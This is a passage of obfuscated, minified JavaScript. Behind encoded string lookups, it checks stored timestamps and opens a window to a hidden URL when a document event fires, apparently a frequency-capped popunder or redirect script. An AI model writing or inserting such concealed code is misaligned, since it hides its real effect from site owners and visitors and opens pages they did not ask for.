_0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());